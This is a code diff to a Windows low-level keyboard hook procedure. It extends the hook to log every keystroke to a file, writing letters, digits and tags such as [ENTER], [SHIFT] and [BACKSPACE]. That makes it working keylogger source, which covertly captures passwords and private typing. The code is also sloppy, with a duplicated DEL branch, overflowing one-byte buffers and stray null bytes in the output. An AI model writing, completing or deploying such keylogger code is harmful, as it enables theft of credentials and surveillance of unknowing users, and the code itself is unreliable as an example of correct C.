@@ -46,8 +46,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
            
 		   
 		   char szTest[2];
+		    char digit[1];
 		  
-		
+			//char letter;
 		   if (p->vkCode)  //redirect a to b
 		{     
           
@@ -55,18 +56,73 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             if ( (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN) ) // Keydown
             {
                
-				sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
+				//sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
 				
-							
-				int scanCode = 65;
-				if ( scanCode > 64 )
-                                 {
-																			
-                                 WriteFile(hFile, szTest,sizeof(szTest),&dwWritten,NULL);
-							
-								 } 
+				if (p->vkCode >= 0x41){
+										// MessageBox(NULL, "Hello, World", "TEST", MB_OK);
 
-			  }
+																	
+								sprintf_s(szTest, "%c", tolower(p->vkCode)); // use L"" prefix for wide chars
+								//sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
+								
+								// tolower(p->vkCode);
+					WriteFile(hFile, szTest,1,&dwWritten,NULL);     
+				 } else if (p->vkCode == 0x20){
+					 char str[] = " ";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+						//					sprintf_s(szTest, "%s", ' '); // use L"" prefix for wide chars
+				 } else if (p->vkCode == 0x10){
+					  char str[] = "[SHIFT]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+						//					sprintf_s(szTest, "%s", '[SHIFT]'); // use L"" prefix for wide chars
+				 } else if (p->vkCode == 0x0D){
+				    	char str[] = "\r\n[ENTER]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+				//							sprintf_s(szTest, "%s", '\n[ENTER]'); // use L"" prefix for wide chars
+			     }  else if (p->vkCode == 0x08){
+					  char str[] = "[BACKSPACE]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+				//							sprintf_s(szTest, "%s", '[BACKSPACE]'); // use L"" prefix for wide chars
+			     }  else if (p->vkCode == 0x09){
+					  char str[] = "[TAB]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+				 }  else if (p->vkCode == 0x11){
+					  char str[] = "[CTRL]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+				 }  else if (p->vkCode == 0x2E){
+					  char str[] = "[DEL]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+				 } else if (p->vkCode == 0x2E){
+					  char str[] = "[DEL]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+				 } else if (p->vkCode == 0x14){
+					  char str[] = "[CAPITAL]";
+
+					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
+				 
+				 } else if (p->vkCode >= 0x30 && p->vkCode <= 0x38){
+					 
+					 sprintf_s(digit, "%c", p->vkCode); // use L"" prefix for wide chars
+											// tolower(p->vkCode);
+					WriteFile(hFile, digit,sizeof(digit),&dwWritten,NULL);    
+				 }
+
+
+
+                           
+							
+			} 
+				
+
+			  
             else if ( (wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP) ) // Keyup
             {
                 // keybd_event('B', 0, KEYEVENTF_KEYUP, 0);
